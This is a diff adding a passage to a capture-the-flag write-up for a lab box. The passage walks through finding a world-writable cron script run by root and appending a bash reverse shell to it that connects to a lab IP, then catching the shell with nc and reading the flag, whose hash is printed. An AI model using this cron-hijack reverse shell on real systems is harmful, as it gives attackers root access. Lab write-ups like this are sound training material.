@@ -1175,9 +1175,124 @@ fg
 
 At this point I have access to the system, lets abuse it.
 
+## Enumeration
+
+This is an art in its self, the author of this box also wrote a great starter guide for manual enumeration of linux called [basic-linux-privilege-escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+
+Going through the steps revels a few ways to get root
+
 ## Cronos Master of All Jobs!
 
-TODO - cronjob hijack writeup
+Following the guide, poking around the system eventually leads to cron jobs.
+the cron.d folder is usually allocated for user defined jobs that don't fit the standard
+daily, hourly, monthly or weekly settings. Nothing irregular about that, but always a good place to start our checks
+``` bash
+ls -la /etc/cron.d/
+```
+
+gives
+
+```
+total 32
+drwxr-xr-x   2 root root  4096 Jun  3  2016 .
+drwxr-xr-x 100 root root 12288 Jun  7  2016 ..
+-rw-r--r--   1 root root   102 Jun  3  2016 .placeholder
+-rw-r--r--   1 root root    56 Jun  3  2016 logrotate
+-rw-r--r--   1 root root   589 Jul 16  2014 mdadm
+-rw-r--r--   1 root root   670 Mar  1  2016 php
+```
+
+checking in the jobs list for executions that are owned by root:
+
+``` bash
+cat /etc/cron.d/*
+```
+gives us an interesting find! A job that runs every 5 min
+
+```
+# snip
+*/5 *   * * *   root  
+# snip
+```
+
+what makes this interesting is that /usr/sbin/logrotate is usually the script to rotate logs
+not /usr/local/sbin/cron-logrotate.sh.
+
+Also running logrotate every 5 minutes seems excessive for a development site, lets check it out.
+
+``` bash
+ls -la /usr/local/sbin/cron-logrotate.sh
+```
+World writable! And executable!
+```
+-rwxrwxrwx 1 root root 51 Jun  3  2016 /usr/local/sbin/cron-logrotate.sh
+```
+
+lets take a look
+
+``` bash
+cat /usr/local/sbin/cron-logrotate.sh 
+```
+
+gives:
+
+```
+#Simon, you really need to-do something about this
+```
+
+Ok, so this means every 5 min root executes the contents of cron-logrotate.sh.
+Because this file is world writable all we need to do append a command to the end of it, wait 5 min and it'll execute as root.
+
+While my imagination runs wild with the possibilities, I'll just append a bash reverse shell and wait 5 min.
+
+```
+echo "bash -i >& /dev/tcp/192.168.56.1/8080 0>&1" >> /usr/local/sbin/cron-logrotate.sh
+# check it worked
+cat /usr/local/sbin/cron-logrotate.sh         
+```
+Gives
+```
+#Simon, you really need to-do something about this
+bash -i >& /dev/tcp/192.168.56.1/8080 0>&1
+```
+
+> can run it to double check: . /usr/local/sbin/cron-logrotate.sh 
+
+on the attacker open a listener and wait 5 min:
+```
+nc -nvlp 8080
+```
+
+after a quick cup of hot beverage:
+
+```
+FIXME!!!
+```
+
+get the flag
+``` bash
+sudo cat /root/flag.txt
+```
+
+W00tW00t!
+
+```
+~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
+                          .-'''''-.
+                          |'-----'|
+                          |-.....-|
+                          |       |
+                          |       |
+         _,._             |       |
+    __.o`   o`"-.         |       |
+ .-O o `"-.o   O )_,._    |       |
+( o   O  o )--.-"`O   o"-.`'-----'`
+ '--------'  (   o  O    o)  
+              `----------`
+b6b545dc11b7a270f4bad23432190c75162c4a2b
+```
+
+
 
 ## Kernel Busting!
 
